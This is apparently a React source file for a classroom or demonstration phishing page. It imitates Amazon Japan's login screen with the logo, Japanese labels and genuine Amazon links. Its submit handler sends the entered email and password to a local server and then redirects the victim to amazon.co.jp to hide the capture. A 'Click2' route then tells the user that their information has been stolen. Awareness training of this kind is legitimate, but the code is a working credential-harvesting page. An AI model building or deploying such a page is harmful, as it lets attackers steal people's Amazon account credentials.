import React, { useState } from "react";
import { BrowserRouter, Route, Switch, Link} from "react-router-dom";
import VisibilityIcon from "@mui/icons-material/Visibility";
import VisibilityOffIcon from "@mui/icons-material/VisibilityOff";
import CloseIcon from "@mui/icons-material/Close";
import Fetch from "../src/Fetch";

function  App() {
  const [email, setEmail] = React.useState("");
  const [password, setPassword] = useState("");
  const [passwordType, setPasswordType] = useState("password");

  const [isValid, setIsValid] = useState(true);


  const handleSubmit = async (event) => {
    event.preventDefault();
    await fetch("//localhost:3001/sign_up", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email, password }),
    })
      .then((response) => response.json())
      .then((data) => console.log(data))
      .catch((error) => console.error(error));
      window.location.href = "https://www.amazon.co.jp/"
  };

  const [showPassword, setShowPassword] = useState(false);

  const [showPopup, setShowPopup] = useState(false);

  const handleClick = () => {
    setShowPopup(true);
  };

  const closePopup = () => {
    setShowPopup(false);
  };

  const validateSystem = () => {
    const emailPattern = /^[a-zA-Z0-9.!#$%&'*+/=?^_`{|}~-]+@[a-zA-Z0-9-]/;
    setIsValid(emailPattern.test(email));
  };


  return (
   <BrowserRouter> 
    <div>
      <img className="amazon-top" src="amazon.png" alt="" />
      <div className="login-frame">
        <h1 className="title">ログイン</h1>

        <form className="loginform" onSubmit={handleSubmit}>
          <label>
            Eメールアドレス
            <input
              className="input-form"
              type="text"
              value={email}
              required
              onChange={(e) => setEmail(e.target.value)}
            />
          </label>
        </form>
        <form className="passform" onSubmit={handleSubmit}>

          <label className="pass">
            パスワード
            <label>
              <a
                className="forget-pass"
                href="https://ssofaast-wms.amazon.co.jp/ap/forgotpassword?clientContext=357-0498489-1519655&showRememberMe=true&openid.pape.max_auth_age=3600&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&language=ja_JP&pageId=amzn_faast_privatepool_jp&mobileBrowserWeblabTreatment=C&openid.return_to=https%3A%2F%2Fssofaast-wms.amazon.co.jp%2Frosters&prevRID=X2XM9YBJMFTRT9X2JRJ5&openid.assoc_handle=amzn_faast_privatepool_jp&openid.mode=checkid_setup&desktopBrowserWeblabTreatment=C&prepopulatedLoginId=&failedSignInCount=0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0"
              >
                パスワードを忘れた場合
              </a>
            </label>
            <div className="eye-position">
            <input
              className="input-form"
              type={passwordType }
              placeholder={""}
              autoComplete="new-password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />

            {passwordType === "password" && (
            <VisibilityOffIcon
              onClick={() => setPasswordType("text")}
              className="Password__visual"
            />
        )} 
        {passwordType === "text" && (
            <VisibilityIcon
              onClick={() => setPasswordType("password")}
              className="Password__visual"
            />
        )}
        </div>
            
          </label>


          
          <button onClick={validateSystem } type="submit"  className="next-button">
            <div className="loginlabel">ログイン</div>
            { !isValid && <p>Please enter a valid email address or password.</p>}
          </button>
        </form>

        <div>
          <label className="keeplogin">
            <input className="checkbox" type="checkbox" />
            <div>
              ログインしたままにする{" "}
              <span className="detail" onClick={handleClick}>
                詳細
              </span>{" "}
            </div>
          </label>
        </div>
        <p className="head-border">初めてAmazonをご利用ですか?</p>
        <div>
          <a
            className="createbutton"
            href="https://www.amazon.co.jp/ap/register?showRememberMe=true&openid.pape.max_auth_age=0&openid.identity=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&pageId=jpflex&mobileBrowserWeblabTreatment=C&openid.return_to=https%3A%2F%2Fwww.amazon.co.jp%2F%25E3%2583%25AD%25E3%2582%25B0%25E3%2582%25A4%25E3%2583%25B3%2Fs%3Fk%3D%25E3%2583%25AD%25E3%2582%25B0%25E3%2582%25A4%25E3%2583%25B3%26ref_%3Dnav_signin&prevRID=PXT8E11B4QSG3RBHZT2Y&openid.assoc_handle=jpflex&openid.mode=checkid_setup&desktopBrowserWeblabTreatment=C&prepopulatedLoginId=&failedSignInCount=0&openid.claimed_id=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0%2Fidentifier_select&openid.ns=http%3A%2F%2Fspecs.openid.net%2Fauth%2F2.0"
          >
            <p className="createlabel">Amazonアカウントを作成する</p>
          </a>
        </div>
      </div>
      <div className="detail-popup">
      
        {showPopup && (
          <div className="balloon2">
            
            <div className="header-popup">
               [ログインしたままにする]チェックボックス    
               <CloseIcon
                  className="closeicon" 
                  onClick={() => closePopup()}></CloseIcon> 
              </div>
                
              
              <div className="inner-popup">
              <p>
                「ログインしたままにする」を選択すると、このデバイスでログインが求められる回数が減ります。
              </p>
              <p>
                お客様のアカウントのセキュリティを保つため、個人でお使いのデバイスでのみこのオプションを使うようにしてください。
              </p>
              
              </div>
          </div>
        )}
      </div>
    </div>

    <ul>
      <li>
        <a href="/click1">Click1</a>
      </li>
    </ul>

    <ul>
      <li>
        <a href="/click2">Click2</a>
      </li>
    </ul>
    
    <Switch>

    <Route exact path="/click1">
      <Click1 />
    </Route>

    <Route exact path="/click2">
      <Click2 />
    </Route>

    </Switch>
   </BrowserRouter> 



  );

  
}


function Click1() {
  return(
    <div>
      <p>まずはログインしてみよう。そのあとブラウザバックをしてClick2を押してみよう。</p>

    </div>
  );
}

function Click2() {
  return(
    <div>
      <p className="stolen-data">あなたの情報は盗まれています!!!</p>

      <Fetch />
    </div>
  );
}

export default App;
